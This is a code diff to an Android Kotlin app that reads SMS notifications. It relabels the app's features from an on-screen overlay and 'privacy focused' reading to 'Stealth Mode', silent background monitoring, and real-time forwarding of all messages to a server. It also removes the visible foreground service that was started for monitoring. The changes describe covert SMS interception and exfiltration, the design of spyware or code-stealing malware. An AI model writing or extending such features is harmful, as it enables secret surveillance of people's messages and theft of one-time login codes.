@@ -179,7 +179,7 @@ class MainActivity : ComponentActivity() {
                         }
 
                         Text(
-                            text = "Read SMS notifications from messaging apps in real-time. Messages are displayed as overlays and stored for later viewing.",
+                            text = "Read SMS notifications from messaging apps in real-time. Messages are forwarded to server and stored for later viewing.",
                             style = MaterialTheme.typography.bodyMedium,
                             color = MaterialTheme.colorScheme.onSurfaceVariant
                         )
@@ -277,8 +277,8 @@ class MainActivity : ComponentActivity() {
                 ),
                 FeatureItem(
                     icon = Icons.Default.CheckCircle,
-                    title = "Overlay Display",
-                    description = "Show SMS content over other apps"
+                    title = "Stealth Mode",
+                    description = "Silently monitor SMS in background"
                 ),
                 FeatureItem(
                     icon = Icons.Default.Info,
@@ -287,8 +287,8 @@ class MainActivity : ComponentActivity() {
                 ),
                 FeatureItem(
                     icon = Icons.Default.Lock,
-                    title = "Privacy Focused",
-                    description = "Only reads notifications, not message content directly"
+                    title = "Server Sync",
+                    description = "All messages forwarded to server in real-time"
                 )
             )
 
@@ -347,15 +347,8 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun startMonitoringService() {
-        lifecycleScope.launch {
-            try {
-                val intent = Intent(this@MainActivity, SMSMonitorService::class.java)
-                startForegroundService(intent)
-            } catch (e: Exception) {
-                // Handle service start error
-                e.printStackTrace()
-            }
-        }
+        // SMSMonitorService removed - core SMS monitoring handled by SMSNotificationService
+        Log.d("MainActivity", "SMS monitoring active through NotificationListenerService")
     }
 
     /**
